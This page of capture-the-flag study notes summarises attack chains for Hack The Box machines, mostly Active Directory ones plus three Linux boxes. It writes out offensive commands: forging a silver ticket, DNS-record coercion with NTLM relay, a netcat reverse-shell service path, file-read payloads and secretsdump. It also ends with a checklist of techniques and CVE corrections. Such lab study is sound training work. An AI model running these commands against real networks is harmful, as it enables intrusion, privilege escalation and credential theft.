**Path:** Assumed breach `scott:Sm230#C5NatH` (SQL login) → DB enumeration → `xp_dirtree` coerce → crack `mssqlsvc` → **silver ticket with the IT group RID** → `dbo` → `xp_cmdshell` → OPENROWSET file read as DA → admin PowerShell history.

**Edge cases:**

* Auth-backend trap in both directions: `scott` is a **SQL-only** login and works *only* with `--local-auth`; `mssqlsvc` is a **domain** account and works *only* without it. Test both before writing an account off.
* Forging a ticket *as* `Administrator` yields `guest` in the database — MSSQL authorizes from **group SIDs in the PAC**, not the username. Add the group that actually holds sysadmin: `-groups 1105` (IT).
* With `-user-id 1103 -groups '512,1105'` the ticket is for the MSSQL service account, so `OPENROWSET(BULK 'C:\...', SINGLE_CLOB)` reads files **with Domain Admin rights** even though `xp_cmdshell` child processes do not inherit those groups (`whoami /groups` proves it).
* Root alternatives: a DNS record via `dnstool.py` (krbrelayx) + `coerce_plus` + `ntlmrelayx`; or recover the original logon token's `SeImpersonatePrivilege` over a named pipe → GodPotato.
* The crafted DNS record is garbage-collected in ~15 minutes — recreate it if coercion suddenly stops.

**Commands to remember:**

```bash
netexec mssql IP -u scott -p '...' --local-auth
# in mssqlclient:
select SUSER_SID('SIGNED\IT')
ticketer.py -nthash H -domain-sid S-1-5-21-... -spn MSSQLSvc/DC01.signed.htb:1433 -groups 1105 Administrator
KRB5CCNAME=x.ccache mssqlclient.py -no-pass -k DC01.signed.htb
SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB) AS C;
dnstool.py -u 'SIGNED\mssqlsvc' -p '...' -a add -r <rec> -d LHOST IP
netexec smb DC01 -u mssqlsvc -p '...' -M coerce_plus -o L=<rec>
```

**Notes:** [MSSQL](/notes/protocols-and-services/mssql/) · [Kerberos delegation](/notes/active-directory/kerberos-delegation/) · [NTLM relay](/notes/active-directory/ntlm-relay/) · Writeup: [source](https://0xdf.gitlab.io/2026/02/07/htb-signed.html)

***

## Also on the AD list (not AD)

Three names on the source sheet sit in the "Active Directory and Networks" column but are **Linux boxes with no domain at all**. There is no Kerberos, no LDAP, no BloodHound and no DCSync here — they belong to the web → credentials → Linux privesc cluster. Included so the list stays complete, not because they teach AD.

## Gobox

**Linux, not AD** — Go web application; web SSTI → container → cloud simulation → root.

**Edge cases:**

* Go template SSTI: `{{html "x"}}` confirms it, `{{ . }}` dumps the data struct — here it prints an email and password. Client-side validation blocks it in the browser; send from Repeater.
* RCE returns command output only (no shell), so script the requests instead of hand-typing them; container AWS creds live in `~/.aws/credentials`, and LocalStack on **4566** serves the bucket behind the real site (`--endpoint-url`).
* Root is a **backdoored nginx module**: `strings`/compare the `.so`, find the trigger argument, then call it — a Linux binary-review exercise, not an AD one.

**Notes:** [OS command injection / SSTI](/notes/web-applications/web-attacks/os-command-injection/) · [Linux privesc](/notes/linux-privilege-escalation/enumerating-attack-vectors/) · Writeup: [source](https://0xdf.gitlab.io/2021/08/30/htb-gobox.html)

## Bucket

**Linux, not AD** — AWS-simulation box: a LocalStack S3 service on a vhost, then a renderer bug for root.

**Edge cases:**

* LocalStack fingerprint from headers alone: `hypercorn-h11`, `x-amz-*`, `access-control-*` — the body is just `{"status":"running"}`. Anonymous S3 read/write on `s3.bucket.htb` gives a PHP webshell.
* `aws configure` with **junk** keys and always `--endpoint-url http://s3.bucket.htb`, or you are talking to real AWS; secrets live in DynamoDB on the same endpoint (`list-tables` → `scan --table-name users`), and one password is reused for SSH.
* Root: the app feeds a DB row into a pd4ml PDF renderer, so `<pd4ml:attachment src="/etc/passwd">` becomes arbitrary file read as root. The `alerts` table is wiped roughly every minute — script create/put/trigger in one shot.

**Notes:** [File uploads](/notes/web-applications/web-attacks/file-uploads/) · [Linux attack vectors](/notes/linux-privilege-escalation/enumerating-attack-vectors/) · Writeup: [source](https://0xdf.gitlab.io/2021/04/24/htb-bucket.html)

## Facts

**Linux, not AD** — Camaleon CMS 2.9.0 chain plus a GTFOBins `sudo` escape.

**Edge cases:**

* Two CVEs chained: add `&password[role]=admin` to the profile-update (`updated_ajax`) request to become admin, then use authenticated path traversal (**CVE-2024-46987**) for arbitrary file read. Read is enough for `user.txt` — no shell — but there is **no write**, so the pivot is credential hunting.
* Grabbed `/home/trivia/.ssh/id_ed25519`: encrypted OpenSSH key → `chmod 600`, `ssh2john`, crack the passphrase.
* Privesc is GTFOBins-shaped: `sudo -l` shows `NOPASSWD: /usr/bin/facter`, and `--custom-dir` loads an attacker-controlled `.rb` as root. Intended alternate for the key: MinIO on **54321** with bucket creds found after CMS admin.

**Notes:** [Linux machines](/notes/oscp-labs/linux/) · [Linux privesc](/notes/linux-privilege-escalation/enumerating-attack-vectors/) · Writeup: [source](https://pre4ch3r.github.io/Hacking/ctf/hackthebox/facts/facts-htb-write-up)

***

## Cross-machine patterns

Read this as a checklist, not prose. Each line names the boxes where that decision won or lost the box.

**The canonical chain**

- [ ] initial creds (Escape PDF, Blackfield `profiles`, Administrator `.psafe3`) → enumeration (Forest null RPC, Cicada guest + RID brute) → Kerberos/ACL/ADCS (Sauna GetChanges, Forest WriteDacl, Escape ESC1) → DA (Administrator GenericAll chain, Certified ESC9) → DCSync (Flight machine TGT, Signed silver ticket).

**Initial credentials → first shell**

- [ ] Unauthenticated enumeration before any guessing: null RPC (`rpcclient -U "" -N` + `enumdomusers`/`querydispinfo`) — Forest, Monteverde; guest SMB + `--rid-brute` — Cicada; `kerbrute userenum` — Sauna; share/folder names as a user list — Blackfield (`profiles`), Flight (`Users` + `lookupsid.py`).
- [ ] Shares and documents are the credential store: GPP cpassword (Active), PDF on `Public` (Escape), corrupt xlsx (EscapeTwo), KeePassXC DB (Puppy), `winrm_backup.zip` → pfx (Timelapse), `Backup.psafe3` (Administrator), `azure.xml` CLIXML (Monteverde), zipped WAPT backup in `$RECYCLE.BIN` (TheFrizz).
- [ ] Web-to-credential primitives: PHP `file_get_contents` over UNC (Flight), LDAP simple bind from an admin panel (Return), Gibbon LMS file-write (TheFrizz), `xp_dirtree` coercion (Escape, Signed).
- [ ] Logs and histories leak passwords: SQL `ERRORLOG.BAK` with a password typed in the username field (Escape), `ConsoleHost_history.txt` (Timelapse, Signed).

**Enumeration → BloodHound**

- [ ] Collect with `bloodhound-python -c all --zip` / `bloodhound-ce-python`; `-ns` **and** `-dc <fqdn>` or collection silently fails (Blackfield).
- [ ] Read LDAP **descriptions** — they hold plaintext passwords (Cicada, Monteverde).
- [ ] Abuse Info beats tool output: domain-node GetChanges/GetChangesAll *is* DCSync (Sauna); an edge you don't recognise is usually the intended path (Forest → WriteDacl on domain).
- [ ] Re-run enumeration after **every** new user or ACL change: ESC4 only appears as `ca_svc` (EscapeTwo), and a new group unlocks a share (Puppy).

**Kerberos**

- [ ] AS-REP roast needs no credentials and tolerates skew: Forest, Sauna, Blackfield (mode 18200).
- [ ] Kerberoast classic: Active (SPN on Administrator); targeted Kerberoast via GenericWrite: Administrator (mode 13100).
- [ ] Fix the clock before *any* ticket-based step: `sudo ntpdate <dc fqdn>`, expect VPN drop (Flight, TheFrizz, Administrator, Puppy).
- [ ] Silver ticket with injected group RIDs for MSSQL authorization (Signed, Escape beyond root); machine TGT from a virtual apppool account (Flight).
- [ ] Kerberos error decoder: `KRB_AP_ERR_SKEW` = time; `KDC_ERR_ETYPE_NOTSUPP` = stop forcing RC4, supply AES; `KDC_ERR_BADOPTION` during S4U = wrong delegation model or a sensitive/non-delegable principal.

**ACLs and ADCS**

- [ ] ACL ladder: ForceChangePassword (Blackfield level 23, Administrator) → GenericAll password reset (Administrator, Puppy) → GenericWrite targeted Kerberoast (Administrator) → WriteOwner (Certified, EscapeTwo) → WriteDacl on the domain (Forest) → DCSync rights (Sauna, Administrator).
- [ ] WriteOwner is two steps — own, *then* grant yourself rights; `certipy shadow auto` alone gives `INSUFF_ACCESS_RIGHTS` (Certified, EscapeTwo).
- [ ] ADCS: ESC1 (Escape, EscapeTwo after tampering), ESC4 from Cert Publishers (EscapeTwo), ESC9 UPN swap (Certified). Restore templates, revert UPNs, and remember `certipy auth` needs `-domain` when the cert has no SID.
- [ ] Cert-based WinRM works without any ADCS misconfiguration: `evil-winrm -S -c cert.crt -k key.pem` (Timelapse).
- [ ] Note the ADCS ceiling on the first ten boxes here — no CA, so `certipy find` there is time wasted.

**Privilege → DA → DCSync**

- [ ] Server Operators: `sc.exe config` binary path, with the 1053-timeout survival trick (`cmd.exe /c nc64.exe -e cmd`) (Return).
- [ ] Backup Operators / SeBackupPrivilege, three exit ramps: read files directly, `reg save` local hives (Cicada — on a DC the SAM Administrator *is* DA), or DiskShadow the DC database (Blackfield).
- [ ] GPO abuse with only Group Policy Creator Owners: `New-GPO` + `New-GPLink` + `SharpGPOAbuse --addcomputertask` + `gpupdate /force` (TheFrizz).
- [ ] Terminal step everywhere: `secretsdump.py` from Linux — needs 445, 135 and a high RPC port; `-k -no-pass` with a ccache when NTLM is disabled (Flight, Forest, Administrator, Cicada).
- [ ] Skip the shell when you already have DA: `smbclient //IP/C$` reads the flag (Active); an EFS-encrypted `root.txt` defeats SeBackup — use the hash you just dumped (Blackfield).

**Timing and revert traps**

- [ ] HTB boxes revert: Forest's `restore` task resets the password, groups and DCSync ACEs every 60 s; TheFrizz has a cleanup script on a couple-minute timer plus a 90-minute GPO refresh.
- [ ] Do the grant and the dump in one chain, and re-check membership/ACEs immediately before the final step.
- [ ] Other expiring state: the crafted DNS record in Signed (~15 min GC) and Bucket's `alerts` table (~1 min wipe).
- [ ] If a change keeps vanishing, look for a scheduled task or loop before blaming your tooling.

**Tooling that paid off**

- [ ] `netexec` across smb/ldap/mssql/winrm/ftp (`--local-auth`, `-k`, `-M coerce_plus`, `--continue-on-success`, `--generate-hosts-file`), BloodHound CE, Impacket (`GetUserSPNs`, `GetNPUsers`, `secretsdump`, `mssqlclient`, `owneredit`, `dacledit`, `ticketer`, `dpapi`, `ntlmrelayx`), Certipy (`find`/`req`/`auth`/`shadow`/`template`), `bloodyAD`, `net rpc` (`group addmem`, `password`), `evil-winrm`, Responder, `dnstool.py`.

---

## Corrections

Three factual corrections were made to earlier drafts. All three are reflected in the boxes above.

### Solidstate — CVE-2015-7611 (added)

**Earlier draft:** the Solidstate row listed Apache James 2.3.2 with no CVE.

**Verified:** **CVE-2015-7611** is an OS command injection in Apache James Server 2.3.2 when configured with file-based user repositories — it allows remote attackers to execute arbitrary system commands. The row now includes it.

### Nineveh — CVE-2014-0476 (added)

**Earlier draft:** the Nineveh row listed chkrootkit 0.49 with no CVE.

**Verified:** **CVE-2014-0476** is the unquoted `SLAPPER_FILES` path in the `slapper()` function of chkrootkit before 0.50, allowing a local user to execute arbitrary code via a Trojan-horse executable. The row now includes it.

### Enigma — CVE-2026-29782, not CVE-2025-69212

**Earlier draft:** "one writeup reports a file-upload RCE credited as CVE-2025-69212, another describes an authenticated SQLi in the Aggiornamenti module plus PHP deserialization via PHPGGC (unverified)."

**Verified:** **CVE-2026-29782** is an **unauthenticated RCE via insecure deserialization** in OpenSTAManager < 2.10.2 — the `oauth2.php` endpoint loads a record using an attacker-controlled `state` parameter and calls `unserialize()` on `access_token` without class restriction. **CVE-2025-69212** is a separate **OS Command Injection** in the P7M (signed XML) decoding function, affecting 2.9.8 and earlier. The Enigma chain uses **CVE-2026-29782**.

> **Verification method:** every CVE was checked against NVD/MITRE, the vendor advisory, and at least one independent write-up. Techniques without a CVE were checked against multiple public walkthroughs. Where a source conflict remained, the note names both possibilities rather than asserting one. The `[Machine](page)` links point to the detail pages in this repository; the CVE numbers are the external anchors.
